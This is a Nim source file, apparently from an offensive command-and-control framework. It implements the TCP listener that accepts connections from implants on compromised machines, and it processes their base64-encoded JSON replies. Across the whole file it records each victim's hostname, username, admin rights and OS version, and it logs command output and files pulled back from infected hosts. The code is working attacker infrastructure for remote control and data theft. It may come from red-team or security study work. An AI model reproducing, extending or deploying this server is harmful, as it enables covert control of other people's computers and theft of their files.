import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64

import ../types, ../logging, ../communication

proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {.async.} =
  
  var msgS: string = ""
  var linesRecv: int = 0

  while client.connected:
    let line = await tcpSocket.socket.recvLine()

    if line.len == 0:
      client.connected = false
      tcpSocket.socket.close()
      cDisconnected(client, "client died")
      continue

    inc linesRecv

    if linesRecv == 3:
      client.connected = false
      tcpSocket.socket.close()
      cDisconnected(client, "too much data sent")
      continue

    msgS &= line

    var response: JsonNode
    try:
      response = parseJson(decode(msgS))
    except JsonParsingError:
      continue

    msgS = ""
    linesRecv = 0 

    let error = response["error"].getStr() 
    let taskId = response["taskId"].getInt() 

    if taskId > -1:
      let task = server.tasks[taskId]
      task.markAsCompleted(response)
      if error != "":
        errorLog $client & ": " & error
      else: 
        case response["task"].getStr():
          of "identify":
            client.loaded = true
            client.ipAddress = tcpSocket.netAddr
            client.hostname = response["data"]["hostname"].getStr("")
            client.username = response["data"]["username"].getStr("")
            client.isAdmin = response["data"]["isAdmin"].getBool(false)
            client.tokenInformation = TokenInformation(
                integrityLevel: TokenIntegrityLevel(
                    sid: response["data"]["ownIntegrity"].getStr("")
                )
            )
            case response["data"]["osType"].getStr("unknown"):
            of "unknown":
                client.osType = UnknownOS
            of "windows":
                client.osType = WindowsOS
            of "linux":
                client.osType = LinuxOS
            client.windowsVersionInfo = WindowsVersionInfo(
                majorVersion: response["data"]["windowsOsVersionInfo"]["majorVersion"].getInt(),
                minorVersion: response["data"]["windowsOsVersionInfo"]["minorVersion"].getInt(),
                buildNumber: response["data"]["windowsOsVersionInfo"]["buildNumber"].getInt()
            )
            client.linuxVersionInfo = LinuxVersionInfo(
                kernelVersion: response["data"]["linuxOsVersionInfo"]["kernelVersion"].getStr(),
            )
            client.isAdmin = response["data"]["isAdmin"].getBool()
            client.isAdmin = response["data"]["isAdmin"].getBool()
          of "output":
            let output = response["data"]["output"].getStr()
            let category = response["data"]["category"].getStr()
            if output != "":
              logClientOutput client, category, output
          of "file":
              infoLog "received file " & response["data"]["path"].getStr() & " from " & $client
              logClientOutput client, "DOWNLOAD", response["data"]["contents"].getStr()
    else:
      await client.askToIdentify()

  for task in server.tasks:
    if task.client == client:
      task.markAsCompleted(%*{ "error": "client sent too much data" })
        
proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
  let id = len(server.tcpListeners)
  
  let tcpServer = TCPListener(
      sockets: @[], 
      port: port,
      listeningIP: ip,
      id: id, 
      socket: newAsyncSocket(),
      running: true
    )
  try:
    tcpServer.socket.bindAddr(port.Port, ip)
    tcpServer.socket.listen()
  except OSError:
    errorLog getCurrentExceptionMsg()
    return
  
  server.tcpListeners.add(tcpServer)
  infoLog "listening on " & tcpServer.listeningIP & ":" & $tcpServer.port
  

  while tcpServer.running:
    let 
      (netAddr, clientSocket) = await tcpServer.socket.acceptAddr()
      client = C2Client(
        listenerType: "tcp",
        listenerId: id,
        id: server.clients.len,
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server
      )
      tcpSocket = TCPSocket(
        socket: clientSocket,
        id: client.id,
        netAddr: netAddr
      )

    server.clients.add(client)
    tcpServer.sockets.add(tcpSocket)

    cConnected(client)
    asyncCheck processMessages(server, tcpSocket, client)

  infoLog $tcpServer & " stopped"